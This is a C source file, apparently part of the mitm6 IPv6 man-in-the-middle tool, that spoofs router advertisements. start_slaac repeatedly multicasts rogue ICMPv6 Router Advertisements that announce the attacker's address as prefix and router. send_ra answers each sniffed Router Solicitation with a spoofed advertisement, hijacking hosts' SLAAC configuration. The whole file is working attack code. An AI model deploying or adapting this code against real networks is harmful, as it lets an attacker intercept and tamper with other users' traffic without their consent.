/*
 * Copyright (c) Rocco Folino
 *
 * This file is part of mitm6.
 *
 * Mitm6 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mitm6 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with mitm6.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <arpa/inet.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>

#include "mitm6.h"
#include "thc-ipv6.h"

extern char *iface;
extern pcap_t *pcap;

static int work = 1;

u_char *mac = NULL;
u_char *ip = NULL;
u_char icmp_data[56];

void send_ra(u_char * data, const struct pcap_pkthdr *header, const u_char *bytes)
{
        u_char *packet = NULL;
        int packet_len = 0;
        u_char *dst = (u_char *)bytes + 14 + 8;
        u_char *dstmac = (u_char *)bytes + 6; 

        if (header->len == 0 || bytes == NULL)
                return;

        /* Skip truncated packets */
        if (header->len > CAP_SNAPLEN) {
                debug("captured truncated packet [pkt-len: %d, snaplen: %d], skipping...",
                      header->len, CAP_SNAPLEN);
                return;
        }

        if (bytes[54] == ICMP6_ROUTERSOL) {
                
                packet = thc_create_ipv6(iface, PREFER_LINK, &packet_len, ip, dst, 255, 0, 0, 0, 0);
                if (packet == NULL) {
                        fatal("IPv6 packet not created");
                        return;
                }

                if (thc_add_icmp6(packet, &packet_len, ICMP6_ROUTERADV, 0, 0xff080800, icmp_data, sizeof(icmp_data), 0) < 0) {
                        fatal("ICMPv6 header not appended");
                        return;
                }

                thc_generate_and_send_pkt(iface, mac, dstmac, packet, &packet_len);
                packet = thc_destroy_packet(packet);
        }
}

void start_slaac(int prefixlen)
{
        u_char *dst = thc_resolve6("FF02::1");
        u_char *dstmac = thc_get_multicast_mac(dst);
        int mtu = thc_get_mtu(iface);
        u_char *packet = NULL;
        int packet_len = 0;

        mac = thc_get_own_mac(iface);
        ip = thc_get_own_ipv6(iface, NULL, PREFER_LINK);

        packet = thc_create_ipv6(iface, PREFER_LINK, &packet_len, ip, dst, 255, 0, 0, 0, 0);
        if (packet == NULL) {
                fatal("IPv6 packet not created");
                return;
        }

        bzero(icmp_data, sizeof(icmp_data));

        /* ICMPv6 RA data */
        //icmp_data[3] = 250; /* reachable timer */
        icmp_data[6] = 4;   /* retrans timer */
        
        /* Option MTU */
        icmp_data[8] = 5;
        icmp_data[9] = 1;
        icmp_data[12] = mtu / 16777216;
        icmp_data[13] = (mtu % 16777216) / 65536;
        icmp_data[14] = (mtu % 65536) / 256;
        icmp_data[15] = mtu % 256;

        /* Option Prefix Information */
        icmp_data[16] = 3;
        icmp_data[17] = 4;
        icmp_data[18] = prefixlen; /* Prefix length */
        icmp_data[19] = 128 + 64;
        memset(&icmp_data[20], 17, 4);
        memset(&icmp_data[24], 4, 4);
        memcpy(&icmp_data[32], ip, 16);
        
        /* Option Source Link-Layer Address */
        icmp_data[48] = 1;
        icmp_data[49] = 1;
        memcpy(icmp_data + 50, mac, 6);

        if (thc_add_icmp6(packet, &packet_len, ICMP6_ROUTERADV, 0, 0xff080800, icmp_data, sizeof(icmp_data), 0) < 0) {
                fatal("ICMPv6 header not appended");
                return;
        }

        if (thc_generate_pkt(iface, mac, dstmac, packet, &packet_len) < 0) {
                fatal("packet not generated");
                return;
        }

        printf("Starting to advertise (Press Control-C to end) ...\n");
        while (work) {
                thc_send_pkt(iface, packet, &packet_len);
                while (pcap_dispatch(pcap, 1, &send_ra, NULL) > 0);
                sleep(5);
        }

        packet = thc_destroy_packet(packet);
}

void stop_slaac()
{
        work = 0;
}
